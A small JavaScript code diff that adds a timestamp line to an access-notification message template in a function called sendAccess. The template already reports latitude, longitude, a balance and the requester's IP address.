@@ -12,6 +12,7 @@ const sendAccess = async(req, res) => {
 🧭 Latitud: ${ body[0].latitude }
 🧭 Longitud: ${ body[0].longitude }
 🪙 Balance: ${ body[0].balance_new }
+🗓 TimeStamp: ${ body[0].access_date }
 🌐 IP: ${ req.headers['x-forwarded-for'] || req.connection.remoteAddress }
 ■■■■■■■■■■■■■■■`
 
